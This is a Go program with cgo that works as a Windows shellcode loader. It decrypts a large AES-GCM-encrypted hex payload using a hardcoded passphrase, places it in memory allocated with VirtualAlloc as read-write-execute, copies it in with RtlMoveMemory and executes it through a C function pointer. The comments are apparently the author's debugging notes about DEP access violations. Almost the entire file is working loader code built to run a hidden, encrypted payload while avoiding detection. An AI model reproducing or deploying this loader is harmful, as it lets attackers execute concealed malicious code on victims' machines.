
package main
/*
#include <windows.h>
#include <stdio.h>

call(char *code) {
    int (*ret)() = (int(*)())code;
    ret();
}
*/
import "C"
import (
	"os"
	"syscall"
	"unsafe"
)
import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/md5"
	"encoding/hex"
	"io/ioutil"
	"fmt"
)

/*Call VirtualAlloc to make memory page executable*/
const (
	MEM_COMMIT             = 0x1000
	MEM_RESERVE            = 0x2000
	PAGE_EXECUTE_READWRITE = 0x40
)


var (
	kernel32           = syscall.MustLoadDLL("kernel32.dll")
	ntdll              = syscall.MustLoadDLL("ntdll.dll")
	VirtualAlloc       = kernel32.MustFindProc("VirtualAlloc")
	procVirtualProtect = syscall.NewLazyDLL("kernel32.dll").NewProc("VirtualProtect")
	// RtlCopyMemory      = ntdll.MustFindProc("RtlCopyMemory")
	RtlMoveMemory = ntdll.MustFindProc("RtlMoveMemory")
)

func VirtualProtect(lpAddress unsafe.Pointer, dwSize uintptr, flNewProtect uint32, lpflOldProtect unsafe.Pointer) bool {
	ret, _, _ := procVirtualProtect.Call(
		uintptr(lpAddress),
		uintptr(dwSize),
		uintptr(flNewProtect),
		uintptr(lpflOldProtect))
	return ret > 0
}

func checkErr(err error) {
	if err != nil {
		if err.Error() != "The operation completed successfully." {
			println(err.Error())
			os.Exit(1)
		}
	}
}

func createHash(key string) string {
	hasher := md5.New()
	hasher.Write([]byte(key))
	return hex.EncodeToString(hasher.Sum(nil))
}

func decrypt(data []byte, passphrase string) []byte {
	// Does not require a IV like AES-CBC
	// unhashes the decryption password by comparing hashes
	key := []byte(createHash(passphrase))
	block, err := aes.NewCipher(key)
	if err != nil {
		panic(err.Error())
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		panic(err.Error())
	}
	nonceSize := gcm.NonceSize()
	nonce, ciphertext := data[:nonceSize], data[nonceSize:]
	plaintext, err := gcm.Open(nil, nonce, ciphertext, nil)
	if err != nil {
		panic(err.Error())
	}
	return plaintext
}

func decryptFile(filename string, passphrase string) []byte {
	// Reads and decrypts and returns a string, which is what we don't want
	data, _ := ioutil.ReadFile(filename)

	return decrypt(data, passphrase)
}

func main() {
	dat := "43779a7149679b9ab04259c2acd414e07e5e8825d01d074a641068f82b4dce019a0f79d19c08e55dd4425badd11658034245b0fcda5640e717dc8be701f8fc0956ebaad5ac0a6049d5f9982b38d776736b3a18a64d1055e4dd4540db06f38497976fb24f058e89dcf660b548f8b4f4bf6bc68857fa0f04cd5cddff69bff27a21e96b4f3285675da369006341dfd4e795b1a0011850064836a4f4c78dc45f4c52077efb6205b26d741c202a272d0c0a4fec37b0d340375582f16ea2f635637e5b6ea52368de3f59432debf9d3583325c42bda61adf0410bc0e6448db3c5d90c6aa661b01819bdc4e3052b4b150093a88dca05a6a810f9be346ae4aad70e8cfaac5f553a4bd923a258e38d8d9c21018445a60c1ea85e8eb73398a7c9b0a4a04faf790e51cbd44284932d39cd6ae1f5d031392ded70d0d9167db652759782f5b04a57079f4a3ad86491bd015e96fb1c583cbdd6b5856fdb628a1887ba14bb4103d8e8ed61e6dc63443f37f89fedb5400f9029f34b4a3f8f2aa40673b05249b2bdf122e3c305b93238aa62d8e899610e3446e8eee74f28eb8eaa077150a9fb6f0d3d72e66585683aef412fd468c67f0ba5f0b2abaf84994d39b04cea04d14e6a64528990496b8b08dfb197a1311d0e05424ad6b82967f54ce045d515e3234ee74effa04e80a7ad3dbaafd67bb83770b6a8456229327c246e4a0ed371edd3928c6fa37974d712964b8826d1a8294be620556f330811c22d5f7e6c851874bbac0973bf6c5dadb68cb8b399d25f83e32925210aa4be0c88d9cb61ff01e8d826a0115be5a83ffa57a94e750f576e25cb154bcf27eb6c95e11299585e409acac221addb816751d6c8ab2bb04055cfff0c4e927fadb9f8b6c309b385d866b82bf28bfe5a20922fd2813d6246194382ec0ed99474fc318bacdf3ff14c99cac03b8d54cb40629ca7a53c7c5bd1bb83f3386d52b3b5901cacd3bcbd8fa70f874535f49d7fd9fb3097540ace2afdc7fe55935ef1a106c5c3b3bf701b6e7a7b1fa8cee9212324322daebb88b4896518553e37bc31c5d84fe765711bee6622bb28184b07adc7609d5279b21501f7b5fa5055b22f8caeea99035107a4348c30b7c990969b4c930c1aa332875c894735a51571efed30fdbb1feabe81976aa4575378641628682807dc680c52276f8b16ed94c8f3f2f44bfab4279a3b3c20873ab442482ae7c5b7f938267507b2baf451d6956c53b8d1a59ff5461ec6104941a73a084b10d7b8ef4f34421740e012e75459faad279da36a8047ea6702c5a243b31a396be3ec2acce74aa2694e586916b04228989e65d32de11d0a0b9b41b8ab0f471b350d6c0977a22e275d48636a52123e1ca3ac1263d55f81b745c643578e749c659ac71b995a195cd5878e42d44426630adf2f91965a2af9135eb4c1dc4704875bd169ded1d8c1179665f50b9c30ced553fdc76d183ef3033244ae74685c9fea28d026c2b0ab052744d7bce66a48762587ac4f80787ce2fa0d2386a9cce01fb34d28eb361fc9ce705befc46a5fc99581d4a6c003fb9b0fd9441c74fd2387416adcdffd4ad071d36d97f1f90676360333cb6057fb349e9c356cd0509780ab607b1aed80838b27a3b68aa35d337ade4f0041125cd561918abebe83482f602282e6963acc4c0146c704b63365228e4907277fe189d9de34e8ba51a73221e0df412b2f3975470516b4d3d636bb4a2e1c15620e91cc51d52c62be782ecc199622ff504906b8cfe26a142eb9edf3cc32051f763ebef401e10e3e413399959e78d6f6ffe0430b406701721d6e45e79169157f5d7adc64257a05142f386d2dc160f85c5f0cfb8704041e76a45a3f17c503719eabf831e27dc5abbade5058b31c4f19b346f0d3cf06d585ddd550f2a6bf89c1cba1bf11f8df1e25fe53b96e97d94da5dd8d4b82c4a39de013379abdaa86ed11931ab13802620f775a51d130c26dc2f7b450ce26f6e2cd9515b124911f985a518830e78568cf8df0442cafb3c76d059751d08d28539796c60737fe7b132c946b8f8dae9c2a37bd24d2a0d25a4b9269141b5532f3e2654dc402424e2f2f7f130ce142463b076ba26e9c097917ae521a85affc6a5bfd7fee0d5287169e5f95acf64df505524c026fd6f17a70e0768014a43aac56b85234ade88407eaa1f98377ea5c637485d3e0dac03dfd28a61bd52909a9eaccc5421aec0cfc33c85a31b98846899bf5c74654776fe3fb8567d088b6745af507bfadd15b173ed1a56005be78817896732b4b379ddf9f2e92b3cf5b724470ea64e0e63661da8a66feba2bc445224bafb3a6d94ab43d6d973dcd5583bf783c1b86123e75f4390810a0cb41e9ec30ddf0da2ec0522d10b2c3ae348974052dc0dc5f76f663e5cf4e58882605b67226ceaee497ceeddeeca9f8c83e9380e62f19a6cfdad4e22e97cb50076e13945ac0c85ab35b0ae99a15f7c79c3f8f73d8224fd5e184dc03a1baf9cbcab4c9ad8a570882be057e4c92b936333c21f4b1dbba0a2541ebef4cf00bb36306c6b8fc8ea623056b71de56d819d427677e58f1ed123ebe19cf50ceb6f78f515be79c109dbb528cd72365034f33cc8bf91de08fc7cc3afe2efaf1d1d5fbd88419ed247cceebe832bfdddd93e92abe0597c8d976010ee97c21a47bb1e3e2409c72cbc12fe0c2676a20a3899b53247993d6c422ff1224cbc7b4a5e9ccec1ca3c2260e983b9cb066eea8248459903f874207dc269d2c69c06a1556862eff94af1cebbce730f57175c55e8a25deeb29d93b67fa7b2045493b21dc4d2843c4a83b687ec046e9ffa4e1ec4e645bc365540a86de74ff821cb8e9bcba0b35cbf04054fe33038627c5ab9450c803ddf1bbc4ba09639c8fd5275a7ac2bb48ed8a026a1d966ae5c8633578c46c8d52b93423c12fd4196b13de95091cddfb58d8372d89d9c2e83704dd393b443faa1c0668c8c219600f55e79fd08a60862512521676a4d7dc87a3925c3697b950e1dbdbf300b44822456a9333feadf45aa820549fc44b362ac9c0adee3f51309c3abb102318ff6b988f6d65441a260b457318d1707451adff92dd57d0b1f9c11284f1e32dbbf156295829b3ef0711751f15d87935576af0551bb85c5d99886d0cdaa8f422cc93a7a86b539dcd051cebc85d7fcec0a8497ac96d523fea392096afa0852c153099c59b694b15cd080d5142c4a6151f34b3e276435e7883d797d877127cbf1bedf6688844b30c0214390a5d67952524955cfc682ec60f48df00391a916f401acafa101d6ee494b3ef34dd81b829df0b64eea44533dbe50091619ac07de62f1be99485945ace684a61444566648668d1e02476a9945d2cb2affad791737d5e4578afd832eb7da5b29ac3bc9a89c92f95b10d650ce3298bbc5d3486038f6b2d25178ab6f1d3a26e8a5fe53f564fef519ccf7874eef3cbb6432a8806624008d870e3f1d2b67bc5ce8e477635fba95f50f96cf0deb11dcc4e34a121e853d6a4f5cc19de46c0442cc9d9c44be4670460f35be04a3fdfc72381b97b2a90e5521c069c9c4d6c447ef8ba71010536e2f865494981da31efe80c232bee3a49588bcf651ee1b6d69ac81059926d752eaa7c88f8ced67fb883df2b3118845e25e26fb7b0e80ed5c7f1dd6f868d7310a30f490cdb0b641a8a8e1bbd63ef0701fc72b34f205bc169a466ff5f7694bc16a23548f570184bdb886911fd133d2019b182a4fae0209020aa9fc0b2c0238e37d688beedba688ef7be4f37185df5b078d2c5594fcf908a79fec20727aa0282c630e002588f485b0a95aadd5a8369bb14bf77686f65ae69cb45984f1a4fddce065e6e956124dcacfa7d60fcc2034a616938ad156f3ba8e62f31b04a2499662dce49100e1937e1355055a4f2cd69bd9cd09aa0238c4ce21c2bd2e72500a7202e1247f9b463daa64617ca7b5fa7b0f86a27e9624acc8cc1acc92f4305f266a45836fd213e4946c2e8b613009d5e8002874c2042b76e831d1f8b832c0f53b121e296714e861a1a05f940f87fcbc2295e6873714cc71ba38c88a55641a535b49cf785680c0e24046c3e0090b40e240502411f2eb3c8fa6081572dee7e911537a63ea4ecfeb67fd0045459a53076e0ae7ad1d5d5395ccb3ceb571eecd34b7c2efcdea021da4e6bdf004bcf94a3779f3a1ae68cc24b78be763961ce56f1f14799dc226758261071a3e7a17ecedd58da1651a1bc19dbc8157d4c8e18bb75591c1dc9405fa0ae401e0e29ef6f73419df6d162c8b56549003c173f48821fca9636554aa3c10b4d6e43343c722bf1b8100b7198b77c1a122bb7f2a399d3df5b2129b5a47e4641080e90c33c0dc0f536f5d00660571f10a08f61b9de69e34b41c3f7d9ad7c04f79f7ea07033f424ddd63e75a16bbe13df1647220f4fd02e5c5d8a223aaaeed250367d79edb5e75ed35dd6b6e10424efafb07365cf3f8d6e39f4db5433b403edf19a605212948993096c772904a54cafd5a82f73d522101cb56fe5c0efc0c9a7ce14719cee691cab83ea5d3d5da7332bbbe72306a426885d55b6814a6c05b1f3fb1f535718343fb737793531436c5ae192c05f6f50ae53bc75d53e33f8f76c5b3040dda9d83198ec56332e9ca9caa3f4861b8a8345b22fccde9948060012165b592c720c2b33b56816663ee210006c051a6cd6d7079a3a14fb93d979f51318f5946a548598bbfa8a06780e9d248731161515715621c9ece632dd44bdc2735d163531de7a952645818aca275b86c811df2aa919ded8"
	decodedDat, err := hex.DecodeString(dat)
	if err != nil {
		fmt.Printf("#{err}")
	}
	decryptedDat := decrypt([]byte(decodedDat), "asdnsandpiasnd")
	/*Shellcode is correctly decrypted*/
	// Note: After the decryption process, we need to just add it as a string here, and have this function typecast it into bytes.
	var shellcode = []byte(decryptedDat)
	// Call virtualalloc
	addr, _, err := VirtualAlloc.Call(0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
	if addr == 0 {
		checkErr(err)
	}
	_, _, err = RtlMoveMemory.Call(addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
	checkErr(err)
/*
Now we are hitting access violations. exit status 0xc0000005, check for DEP in WinDBG
Found problem,
   0:000> !vprot 00007ffb
   BaseAddress:       0000000000007000
   AllocationBase:    0000000000000000
   RegionSize:        000000007ffd9000
   State:             00010000  MEM_FREE
   Protect:           00000001  PAGE_NOACCESS
The memory page is not executable
*/
	//fmt.Printf("DEBUG Contents of Address\r\n%s", *addr)
	C.call((*C.char)(unsafe.Pointer(addr)))
	//syscall.Syscall(addr, 0, 0, 0, 0)
}